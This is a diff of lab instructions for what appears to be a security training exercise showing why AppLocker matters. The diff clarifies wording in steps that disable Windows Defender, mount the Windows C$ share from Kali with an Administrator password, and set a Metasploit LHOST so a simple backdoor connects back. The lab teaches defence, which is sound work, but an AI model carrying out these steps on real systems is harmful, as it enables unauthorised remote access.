@@ -2,7 +2,7 @@
 
 Applocker Instructions:
 
-Let’s see what happens when we do not have **AppLocker** running.  We will set up a simple backdoor and have it connect back to the **Kali** system.  Remember, the goal is not to show how we can bypass **EDR** and **Endpoint** products.  It is to create a simple backdoor and have it connect back.
+Let’s see what happens when we do not have **AppLocker** running.  We will set up a simple backdoor and have it connect back to the **Kali** system. Remember, the goal is not to show how we can bypass **EDR** and **Endpoint** products.  It is to create a simple backdoor and have it connect back.
 
 Before we begin, we need to disable **Defender**. Start by opening an instance of **Windows Powershell**. Do this by clicking on the **Powershell** icon in the taskbar.
 
@@ -29,7 +29,7 @@ Next, set a password for the Administrator account that you can remember
 
 Please note, that is a very bad password.  Come up with something better. But, please remember it.
 
-Before we move on from our Powershell window, lets get our IP by running the following command:
+Before we move on from our Powershell window, lets get the IP of our windows machine by running the following command:
 
 <pre>ipconfig</pre>
 
@@ -37,7 +37,7 @@ Before we move on from our Powershell window, lets get our IP by running the fol
 
 **REMEMBER - YOUR IP WILL BE DIFFERENT**
 
-Write this IP down so we can use it again later.
+Write this (Windows) IP down so we can use it again later.
 
 Let’s continue by opening a **Kali** instance.
 
@@ -53,7 +53,7 @@ Let's start by getting root access in our terminal.
 
 We need to run the following command in order to mount our remote system to the correct directory:
 
-<pre>mount -t cifs //[Your IP Address]/c$ /mnt/windows-share -o username=Administrator,password=password1234</pre>
+<pre>mount -t cifs //[Your Windows IP Address]/c$ /mnt/windows-share -o username=Administrator,password=password1234</pre>
 
 **REMEMBER - YOUR IP ADDRESS AND PASSWORD WILL BE DIFFERENT.**
 
@@ -101,6 +101,10 @@ Now run all of the following commands to set the correct parameters:
 <pre>set LHOST [Your Linux IP Address]</pre>
 
 **REMEMBER - YOUR IP WILL LIKELY BE DIFFERENT!**
+
+You can check your settings by typing:
+
+<pre>options</pre>
 
 Go ahead and run the exploit:
 
